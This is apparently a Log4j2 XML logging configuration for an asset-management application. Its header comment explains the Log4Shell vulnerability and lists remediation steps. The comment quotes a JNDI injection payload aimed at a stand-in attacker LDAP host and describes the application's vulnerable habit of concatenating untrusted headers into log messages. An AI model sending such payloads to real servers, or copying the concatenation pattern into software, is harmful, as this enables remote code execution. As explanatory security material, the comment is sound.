<?xml version="1.0" encoding="UTF-8"?>
<!--
    Log4j2 configuration for Asset Manager.

    CVE-2021-44228 (Log4Shell): Log4j2 versions 2.0-beta9 through 2.14.1
    perform JNDI lookups when ${...} expressions appear in the *message text*
    passed to any log method.  The PatternLayout %msg specifier triggers this
    evaluation.  Because controllers in this application concatenate untrusted
    HTTP inputs (X-Forwarded-For, User-Agent, query parameters) directly into
    log strings, a caller can inject ${jndi:ldap://attacker.com/x} and cause
    the server to connect to an attacker-controlled LDAP server.

    Fix:
      1. Upgrade log4j-core to >= 2.17.1 (remove the <log4j2.version> override
         in pom.xml).
      2. Add the JVM flag -Dlog4j2.formatMsgNoLookups=true as a defence-in-depth
         measure for any remaining 2.x installations.
      3. Change all logger.xxx("text " + variable) calls to the parameterised form
         logger.xxx("text {}", variable) so the message string itself never
         contains attacker-supplied content before Log4j processes it.
-->
<Configuration status="WARN">
    <Appenders>
        <Console name="Console" target="SYSTEM_OUT">
            <!-- %msg prints the full message string, including any JNDI payloads -->
            <PatternLayout pattern="%d{HH:mm:ss.SSS} [%t] %-5level %logger{36} - %msg%n"/>
        </Console>

        <RollingFile name="AppLog"
                     fileName="logs/asset-manager.log"
                     filePattern="logs/asset-manager-%d{yyyy-MM-dd}-%i.log.gz">
            <PatternLayout>
                <Pattern>%d %p %c{1.} [%t] %m%n</Pattern>
            </PatternLayout>
            <Policies>
                <TimeBasedTriggeringPolicy/>
                <SizeBasedTriggeringPolicy size="10 MB"/>
            </Policies>
            <DefaultRolloverStrategy max="14"/>
        </RollingFile>
    </Appenders>

    <Loggers>
        <Logger name="com.company.assetmanager" level="debug" additivity="false">
            <AppenderRef ref="Console"/>
            <AppenderRef ref="AppLog"/>
        </Logger>
        <Root level="info">
            <AppenderRef ref="Console"/>
            <AppenderRef ref="AppLog"/>
        </Root>
    </Loggers>
</Configuration>
